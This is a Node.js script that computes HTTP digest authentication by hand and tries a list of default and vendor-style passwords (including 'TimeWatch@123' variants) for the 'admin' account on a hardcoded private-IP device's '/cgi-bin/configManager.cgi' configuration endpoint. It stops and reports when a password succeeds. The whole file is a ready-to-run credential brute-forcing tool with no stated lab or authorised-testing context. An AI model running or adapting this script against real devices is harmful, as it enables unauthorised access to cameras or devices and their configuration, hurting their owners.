const http = require('http');
const crypto = require('crypto');

function md5(str) {
  return crypto.createHash('md5').update(str).digest('hex');
}

function parseDigestHeader(header) {
  const params = {};
  header.replace(/Digest\s+/i, '').split(/,\s*/).forEach(part => {
    const [k, v] = part.split('=');
    if (k && v) params[k.trim()] = v.replace(/"/g, '').trim();
  });
  return params;
}

function computeDigestAuth({ user, password, method, uri, realm, nonce, qop, nc = '00000001', cnonce = 'abc123xyz' }) {
  const ha1 = md5(`${user}:${realm}:${password}`);
  const ha2 = md5(`${method}:${uri}`);
  if (qop === 'auth') {
    const response = md5(`${ha1}:${nonce}:${nc}:${cnonce}:${qop}:${ha2}`);
    return `Digest username="${user}", realm="${realm}", nonce="${nonce}", uri="${uri}", qop=${qop}, nc=${nc}, cnonce="${cnonce}", response="${response}"`;
  } else {
    const response = md5(`${ha1}:${nonce}:${ha2}`);
    return `Digest username="${user}", realm="${realm}", nonce="${nonce}", uri="${uri}", response="${response}"`;
  }
}

function testAuth(user, password) {
  return new Promise(resolve => {
    const uri = '/cgi-bin/configManager.cgi?action=getConfig&name=General';
    // Step 1: get 401 and parse nonce
    http.get(`http://172.25.26.241${uri}`, res => {
      if (res.statusCode !== 401) return resolve({ user, password, status: res.statusCode });
      const authHeader = res.headers['www-authenticate'];
      if (!authHeader) return resolve({ user, password, error: 'No www-authenticate' });

      const d = parseDigestHeader(authHeader);
      const auth = computeDigestAuth({
        user,
        password,
        method: 'GET',
        uri,
        realm: d.realm,
        nonce: d.nonce,
        qop: d.qop
      });

      http.get(`http://172.25.26.241${uri}`, { headers: { Authorization: auth } }, authRes => {
        let body = '';
        authRes.on('data', c => body += c);
        authRes.on('end', () => resolve({ user, password, status: authRes.statusCode, body: body.slice(0, 150) }));
      }).on('error', err => resolve({ user, password, error: err.message }));
    }).on('error', err => resolve({ user, password, error: err.message }));
  });
}

async function run() {
  const passwords = [
    'admin',
    'admin123',
    'admin@123',
    'Admin@123',
    'T!meW@tch#123@',
    '123456',
    'admin1234',
    'TimeWatch@123',
    'timewatch',
    '12345678',
    'password'
  ];

  for (const p of passwords) {
    const res = await testAuth('admin', p);
    console.log(`admin:${p} -> Status:`, res.status, res.body ? res.body.slice(0, 80) : res.error);
    if (res.status === 200) {
      console.log('SUCCESS! Found password:', p);
      break;
    }
  }
}

run();
